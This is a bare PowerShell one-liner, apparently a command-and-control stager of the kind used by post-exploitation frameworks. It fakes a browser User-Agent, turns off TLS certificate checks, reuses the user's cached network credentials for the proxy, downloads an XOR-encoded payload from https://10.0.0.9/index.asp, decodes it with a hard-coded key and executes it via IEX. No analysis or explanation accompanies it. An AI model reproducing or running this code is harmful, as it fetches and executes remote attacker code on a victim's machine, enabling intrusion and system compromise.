
$WC=NEW-ObjeCT SYsTeM.NET.WEBClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$Wc.HeadErS.ADD('User-Agent',$u);$Wc.Proxy = [SySTeM.Net.WEBREqUEsT]::DEfauLtWebPrOxY;$WC.PRoxY.CreDeNTiAlS = [SYsteM.Net.CReDeNTIALCachE]::DEfAuLTNETwOrKCRedEnTIaLS;$K='F/\Pg-j+7;TM!S[1o4f~l|pJ8rk`mH]a';$i=0;[CHaR[]]$b=([cHar[]]($Wc.DOwnLOAdSTrING("https://10.0.0.9:443/index.asp")))|%{$_-BXOr$K[$i++%$K.LENGTH]};IEX ($B-joIN'')

